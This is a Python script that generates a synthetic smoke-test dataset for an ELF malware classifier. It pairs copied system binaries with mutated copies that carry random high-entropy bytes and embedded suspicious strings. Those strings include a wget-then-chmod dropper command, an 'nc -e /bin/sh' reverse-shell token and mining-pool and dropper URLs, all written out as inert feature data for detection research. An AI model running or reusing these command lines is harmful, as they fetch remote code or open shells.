#!/usr/bin/env python3
"""
Generate a SMOKE-TEST dataset (no real malware needed) so you can validate the
whole train/evaluate/serve pipeline before wiring in the real MalwareBazaar data.

  * benign  = real ELF binaries copied from the host's /usr/bin, /bin, /usr/sbin
  * "malware" = benign ELFs mutated to *look* like droppers/bots for feature
                purposes only: a high-entropy blob is appended and suspicious
                strings (bot family names, dropper URLs/IPs, shell tokens) are
                embedded. These are NOT functional malware -- they never run and
                are only used to exercise the feature/ML code paths.

Replace with real data (collect_benign.py + collect_malware.py) for real results.

Usage:
    python3 make_synthetic.py --out ../datasets --n 120
"""
import argparse
import os
import random
import shutil
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from features.elf_features import is_elf, sha256_of  # noqa: E402

SYS_DIRS = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"]
BOT_STRINGS = [
    b"MIRAI", b"gafgyt", b"/bin/busybox", b"stratum+tcp://pool.evil:3333",
    b"http://185.10.68.12/bins/mips", b"wget http://45.9.148.7/x -O /tmp/x",
    b"chmod +x /tmp/x", b"POST /cdn-cgi/l/chk_captcha", b"UDP flood",
    b"192.168.0.1", b"10.0.0.5", b"nc -e /bin/sh",
]


def gather_benign(limit: int) -> list[Path]:
    found = []
    for d in SYS_DIRS:
        if not os.path.isdir(d):
            continue
        for name in os.listdir(d):
            fp = Path(d) / name
            if fp.is_file() and not fp.is_symlink() and is_elf(fp) and fp.stat().st_size > 2048:
                found.append(fp)
    random.shuffle(found)
    return found[:limit]


def make_malicious(src: Path, dst: Path):
    data = bytearray(src.read_bytes())
    # embed suspicious strings
    for s in random.sample(BOT_STRINGS, k=random.randint(4, len(BOT_STRINGS))):
        data += b"\x00" + s
    # append a high-entropy "packed" blob
    data += os.urandom(random.randint(4096, 20000))
    dst.write_bytes(data)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="../datasets")
    ap.add_argument("--n", type=int, default=120, help="samples per class")
    args = ap.parse_args()

    out = Path(args.out)
    b_dir = out / "benign"
    m_dir = out / "malware" / "inert"
    b_dir.mkdir(parents=True, exist_ok=True)
    m_dir.mkdir(parents=True, exist_ok=True)

    benign = gather_benign(args.n * 2)
    if len(benign) < args.n:
        sys.exit(f"[!] only found {len(benign)} benign ELF; lower --n")

    for fp in benign[:args.n]:
        digest = sha256_of(fp)
        shutil.copy(fp, b_dir / f"{digest}.elf")
    print(f"[+] benign: {args.n}")

    for i, fp in enumerate(benign[args.n:args.n * 2]):
        tmp = m_dir / f"syn_{i}.elf"
        make_malicious(fp, tmp)
        final = m_dir / f"{sha256_of(tmp)}.elf"
        tmp.rename(final)
    print(f"[+] synthetic malicious: {args.n}")
    print(f"[done] -> {b_dir} , {m_dir}")


if __name__ == "__main__":
    main()
